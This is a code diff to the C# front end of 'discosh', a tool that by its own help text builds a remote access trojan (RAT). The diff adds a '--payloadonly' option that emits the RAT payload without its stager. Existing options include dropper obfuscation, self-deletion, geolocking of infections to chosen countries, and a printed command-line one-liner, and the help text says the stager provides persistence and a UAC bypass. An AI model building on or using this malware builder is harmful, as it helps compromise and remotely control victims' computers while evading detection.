@@ -11,6 +11,7 @@ namespace discosh
         private static string _geolock = string.Empty;
         private static bool _obf = false;
         private static bool _delself = false;
+        private static bool _ponly = false;
 
         static void Main(string[] args)
         {
@@ -25,6 +26,7 @@ namespace discosh
                 else if (args[i] == "-obf" || args[i] == "--obfuscate") _obf = true;
                 else if (args[i] == "-d" || args[i] == "--deleteself") _delself = true;
                 else if (args[i] == "-gl" || args[i] == "--geolock") _geolock = args[i + 1];
+                else if (args[i] == "-po" || args[i] == "--payload") _ponly = true;
             }
 
             if (_output == string.Empty)
@@ -49,10 +51,10 @@ namespace discosh
                 Environment.Exit(1);
             }
 
-            byte[] result = PGen.Generate(_token, _prefix, _obf, _delself, _geolock);
+            byte[] result = PGen.Generate(_token, _prefix, _obf, _delself, _geolock, _ponly);
             Console.WriteLine($"Writing output to: {_output}");
             File.WriteAllBytes(_output, result);
-            Console.WriteLine($"\nCommand line one-liner: {PGen.GenerateCommand(_token, _prefix, _geolock)}\n");
+            Console.WriteLine($"\nCommand line one-liner: {PGen.GenerateCommand(_token, _prefix, _geolock, _ponly)}\n");
 
             Console.ForegroundColor = ConsoleColor.Green;
             Console.WriteLine("Done.");
@@ -77,7 +79,7 @@ namespace discosh
             Console.ForegroundColor = ConsoleColor.White;
             Console.Write("Usage:");
             Console.ForegroundColor = ConsoleColor.Gray;
-            Console.Write(" discosh [-h|--help] [-o|--output] [-t|--token] [-p|--prefix] [-obf|--obfuscate] [-d|--deleteself] [-gl|--geolock]\n\n");
+            Console.Write(" discosh [-h|--help] [-o|--output] [-t|--token] [-p|--prefix] [-obf|--obfuscate] [-d|--deleteself] [-gl|--geolock] [-po|payloadonly]\n\n");
 
             Console.ForegroundColor = ConsoleColor.White;
             Console.WriteLine("Arguments:");
@@ -89,6 +91,7 @@ namespace discosh
             Console.WriteLine("--obfuscate     Obfuscate dropper");
             Console.WriteLine("--deleteself    Make dropper delete itself");
             Console.WriteLine("--geolock       Make RAT only infect machines in specified countries. To specify multiple countries, seperate each country name with a comma (no spaces)");
+            Console.WriteLine("--payloadonly   Generate RAT payload only without stager (no persistence and no UAC bypass)");
             Console.WriteLine();
             Console.ForegroundColor = oldc;
             Environment.Exit(0);
